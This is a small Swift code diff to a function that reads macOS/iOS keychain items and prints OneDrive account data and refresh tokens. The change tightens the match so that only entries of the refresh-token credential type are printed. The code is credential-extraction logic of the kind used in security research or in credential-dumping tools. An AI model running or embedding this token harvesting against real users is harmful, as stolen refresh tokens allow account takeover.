@@ -65,7 +65,7 @@ func extractOneDriveSecretsFromKeychain() {
     }
     for item in array {
       if let data = item[kSecValueData as String] as? Data, let string = String(data: data, encoding: .utf8) {
-        if string.hasPrefix("{\"client_id\":") {
+        if string.hasPrefix("{\"client_id\":") && string.contains("\"credential_type\":\"RefreshToken\"") {
           print("OneDrive Refresh Token Data:\n\(string)")
         } else if string.hasPrefix("{\"client_info\":") {
           print("OneDrive Account Data:\n\(string)")
